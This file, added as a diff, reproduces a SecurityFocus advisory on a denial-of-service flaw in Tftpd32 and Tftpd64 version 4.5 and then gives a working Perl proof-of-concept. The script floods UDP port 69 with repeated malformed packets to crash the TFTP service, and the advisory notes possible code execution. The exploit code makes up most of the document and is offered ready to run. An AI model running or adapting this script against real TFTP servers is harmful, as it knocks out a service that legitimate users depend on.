@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/67404/info
+
+Tftpd32 and Tftpd64 are prone to denial-of-service vulnerabilities.
+
+An attacker can exploit this issue to crash the affected application, denying service to legitimate users. Due to the nature of this issue, code-execution may be possible; however this has not been confirmed.
+
+The following products are vulnerable:
+
+Tftpd32 4.5
+Tftpd64 4.5
+
+#!/usr/bin/perl -w
+ 
+use IO::Socket;
+ 
+for (my $j = 0; $j < 2; $j++)
+{
+    sleep(2);
+    for (my $i = 0; $i < 1500; $i++)
+    {
+        $st_socket = IO::Socket::INET->new(Proto=>'udp', 
+PeerAddr=>'127.0.0.1', PeerPort=>69) or die "connect error";
+     
+        $p_c_buffer = "\x0c\x0d" x 10;
+     
+        print $st_socket $p_c_buffer;
+     
+        close($st_socket);
+ 
+        print "sent " . $i . "\n";
+    }
+}
+ 
+exit;
+
